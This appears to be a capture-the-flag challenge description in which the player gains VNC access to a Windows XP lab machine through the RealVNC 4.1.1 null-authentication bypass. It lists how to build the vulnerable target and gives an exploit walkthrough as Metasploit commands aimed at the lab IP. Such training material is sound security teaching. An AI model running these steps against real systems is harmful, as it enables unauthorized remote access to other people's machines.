Fun with XP
============

Goal
----
* Attacker gains VNC access to a Windows XP machine by the NULL auth bug in realvnc 4.1.1

Description
-----------
Here's your IP: 10.75.10.3. Get the token. (Remember to connect to the VPN, more info on the [category-page](http://<hostname>/categories/53502359703ae48b5a00002b).)

How to make
-----------
* Windows XP (SP3)
* Attached realvnc installer
* Make a text document

How to exploit
---------------
* There are multiple ways of solving this. Example:
* Use metasploit:
** msfconsole
** use auxiliary/admin/vnc/realvnc\_41\_bypass
** set RHOST 10.75.10.3
** run
** Connect to localhost

